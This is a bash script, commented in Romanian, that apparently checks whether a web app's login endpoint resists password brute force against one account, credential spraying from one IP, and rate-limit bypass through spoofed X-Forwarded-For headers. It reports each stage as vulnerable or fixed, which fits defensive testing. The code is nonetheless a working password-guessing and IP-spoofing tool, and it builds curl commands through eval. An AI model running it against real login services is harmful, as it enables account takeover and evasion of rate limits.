#!/usr/bin/env bash

# Stage A: brute force pe acelasi cont (wordlist)
# Stage B: spray pe emailuri diferite (acelasi IP)
# Stage C: verificare fix-uri (rate limit + lockout cu IP spoofing)

set +e
set +o pipefail
source "$(dirname "$0")/config.sh"

TARGET_EMAIL="${1:-}"
WORDLIST="${2:-}"

LOGIN_URL="$BASE_URL/login"
mkdir -p "$OUT_DIR"

# wordlist default
if [ -z "$WORDLIST" ]; then
  WORDLIST="$OUT_DIR/43_default_wordlist.txt"
  cat > "$WORDLIST" <<'EOF'
123456
password
qwerty
admin
letmein
000000
111111
abc123
parola
test
Parola123!
ParolaBuna123$
EOF
fi

if [ ! -f "$WORDLIST" ]; then
  echo "Wordlist not found: $WORDLIST"
  exit 2
fi

OUT_FILE="$OUT_DIR/43_bruteforce_and_lockout.txt"
: > "$OUT_FILE"

# scrie in fisier si in terminal
echo "Brute force + rate limiting & lockout" | tee -a "$OUT_FILE"
echo "Endpoint: $LOGIN_URL" | tee -a "$OUT_FILE"
echo "Target:   $TARGET_EMAIL" | tee -a "$OUT_FILE"
echo "Wordlist: $WORDLIST" | tee -a "$OUT_FILE"
echo | tee -a "$OUT_FILE"

attempt() {
  local label="$1" email="$2" pass="$3"
  local extra_headers="${4:-}"  
  local res code body

#eval pentru headere dinamice
  res="$(eval curl -s -i -X POST "$LOGIN_URL" \
    -H "\"Content-Type: application/json\"" \
    $extra_headers \
    -d "{\"email\":\"$email\",\"password\":\"$pass\"}")"
#extrage cod http
# HTTP/1.1 401 Unauthorized -> 401
  code="$(echo "$res" | awk 'NR==1{print $2}')"
# sare peste headers, ia doar body, scurteaza la 160 de caractere
  body="$(echo "$res" | awk 'BEGIN{h=1} h && /^\r?$/{h=0; next} !h' | tr -d '\n' | cut -c1-160)"

  printf "%-42s -> HTTP %s | %s\n" "$label" "$code" "$body" | tee -a "$OUT_FILE"
# A1 try pass='123456' -> HTTP 401 | invalid password
  echo "$code"
}

# A:Brute force pe acelasi cont
echo "[A] Brute force pe acelasi cont" | tee -a "$OUT_FILE"
echo "    VULNERABLE: toate cererile trec | FIXED: 429 sau lockout după N" | tee -a "$OUT_FILE"
echo | tee -a "$OUT_FILE"

STAGE_A_RESULT="VULNERABLE"
a_i=0

for PASS in $(grep -vE '^\s*$|^\s*#' "$WORDLIST"); do
  a_i=$((a_i+1))
  code="$(attempt "A$a_i try pass='$PASS'" "$TARGET_EMAIL" "$PASS")"

  if [ "$code" = "429" ]; then
    STAGE_A_RESULT="FIXED (rate limit HTTP 429 dupa $a_i incercari)"
    break
  fi
  if [ "$code" = "200" ]; then
    echo "[OK] Stage A: parola corecta gasita: $PASS" | tee -a "$OUT_FILE"
    exit 0
  fi
  # detecteaza lockout in body
  if echo "$body" | grep -iq "locked\|blocat\|too many"; then
    STAGE_A_RESULT="FIXED (account lockout dupa $a_i incercari)"
    break
  fi

  sleep 0.05
  [ "$a_i" -ge 20 ] && { echo "[INFO] Stage A: limita 20 incercari atinsa." | tee -a "$OUT_FILE"; break; } 
done

echo "[RESULT Stage A] $STAGE_A_RESULT" | tee -a "$OUT_FILE"
echo | tee -a "$OUT_FILE"

# B: Credential spray (emailuri diferite, acelasi IP) 
echo "[B] Credential spray (email-uri diferite, acelasi IP)" | tee -a "$OUT_FILE"
echo "    VULNERABLE: fara 429 | FIXED: 429 dupa N cereri per IP" | tee -a "$OUT_FILE"
echo | tee -a "$OUT_FILE"

STAGE_B_RESULT="VULNERABLE"

for i in $(seq 1 40); do
  e="spray_${i}@attacker.test"
  code="$(attempt "B$i spray email=$e" "$e" "WrongSpray_${i}!")"

  if [ "$code" = "429" ]; then
    STAGE_B_RESULT="FIXED (rate limit per IP după $i cereri)"
    break
  fi
  sleep 0.02
done

echo "[RESULT Stage B] $STAGE_B_RESULT" | tee -a "$OUT_FILE"
echo | tee -a "$OUT_FILE"

#C: Verificare lockout i DB cu IP spoofing
echo "[C] Lockout in DB cu IP spoofing (bypass rate limit per IP)" | tee -a "$OUT_FILE"
echo "    VULNERABLE: cont niciodata blocat | FIXED: 'locked' dupa N esecuri" | tee -a "$OUT_FILE"
echo | tee -a "$OUT_FILE"

STAGE_C_RESULT="VULNERABLE"

for i in $(seq 1 10); do
  FAKE_IP="$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256))"
  HEADERS="-H 'X-Forwarded-For: $FAKE_IP'"

  code="$(attempt "C$i spoofed IP=$FAKE_IP" "$TARGET_EMAIL" "WrongPass_spoof_$i" "$HEADERS")"

  if [ "$code" = "429" ]; then
    echo "[INFO] Stage C: rate limit per IP (chiar și cu spoofing)" \
      | tee -a "$OUT_FILE"
  fi

  # verifica daca contul e blocat (adapteaza mesajul la raspunsul serverului tau)
  RES_BODY="$(eval curl -s -X POST "$LOGIN_URL" \
    -H "\"Content-Type: application/json\"" \
    $HEADERS \
    -d "{\"email\":\"$TARGET_EMAIL\",\"password\":\"WrongPass_check\"}")"

  if echo "$RES_BODY" | grep -iq "locked\|blocat\|temporarily"; then
    STAGE_C_RESULT="FIXED (account lockout în DB dupa $i incercari cu IP-uri diferite)"
    echo "[FIXED] $STAGE_C_RESULT" | tee -a "$OUT_FILE"
    break
  fi

  sleep 0.05
done

echo "[RESULT Stage C] $STAGE_C_RESULT" | tee -a "$OUT_FILE"
echo | tee -a "$OUT_FILE"